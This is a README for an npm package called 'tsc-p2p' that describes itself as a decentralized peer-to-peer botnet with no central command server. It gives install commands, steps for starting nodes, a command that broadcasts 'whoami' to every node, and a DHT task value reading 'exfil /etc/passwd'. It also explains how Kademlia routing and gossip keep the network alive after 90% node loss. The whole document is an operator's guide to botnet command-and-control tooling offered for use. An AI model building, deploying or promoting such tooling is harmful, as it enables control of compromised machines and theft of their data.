# tsc-p2p

Decentralized P2P botnet mesh using Kademlia DHT + gossip protocol. No central C2 server. Network survives 90% node loss.

## Installation

```bash
npm install -g tsc-p2p
```

## Quick Start

### Start first node (bootstrap)

```bash
tsc-p2p node --port 7890 --id bootstrap1
```

### Start a second node

```bash
tsc-p2p node --port 7891 --id node2 --bootstrap 127.0.0.1:7890
```

### Gossip a command to the network

```bash
tsc-p2p send --key "cmd:all" --value "whoami" --bootstrap 127.0.0.1:7890
```

### Store in DHT

```bash
tsc-p2p store --key task123 --value "exfil /etc/passwd" --bootstrap 127.0.0.1:7890
```

### Look up from DHT

```bash
tsc-p2p lookup --key task123 --bootstrap 127.0.0.1:7890
```

### Check network status

```bash
tsc-p2p status --bootstrap 127.0.0.1:7890
```

## Architecture

```
                    ┌──────────────┐
                    │  Bootstrap   │
                    │   Node 7890  │
                    └──────┬───────┘
                           │
          ┌────────────────┼────────────────┐
          │                │                │
   ┌──────▼──────┐  ┌──────▼──────┐  ┌──────▼──────┐
   │   Node A    │  │   Node B    │  │   Node C    │
   │   :7891     │◄─┤   :7892     │◄─┤   :7893     │
   └──────┬──────┘  └──────┬──────┘  └──────┬──────┘
          │                │                │
   Kademlia DHT ───────────┴──────────────────┘
   Gossip protocol propagates commands
   Each node knows k closest peers
```

## How It Works

1. **Node ID**: Each node gets a SHA-1 hash of its identity string (160-bit)
2. **Routing table**: 160 k-buckets, each holds up to 20 peers sorted by XOR distance
3. **Bootstrap**: New node contacts bootstrap node, performs iterative node lookup to populate routing table
4. **Beacon**: 60-second periodic routing table refresh
5. **Gossip**: Commands propagate via epidemic broadcast — each node sends to alpha=3 closest peers, TTL=5
6. **DHT**: Distributed hash table stores key-value pairs across k closest nodes
7. **Resilience**: Network survives 90% node loss — commands still propagate through remaining nodes

## CLI Reference

### `tsc-p2p node`

| Flag | Default | Description |
|------|---------|-------------|
| `--port` | *required* | UDP listen port |
| `--id` | *required* | Node identity string |
| `--bootstrap` | — | Bootstrap node `host:port` |

### `tsc-p2p send`

| Flag | Description |
|------|-------------|
| `--key` | Message key (e.g. `cmd:all`) |
| `--value` | Message content |
| `--bootstrap` | Bootstrap node to inject message |
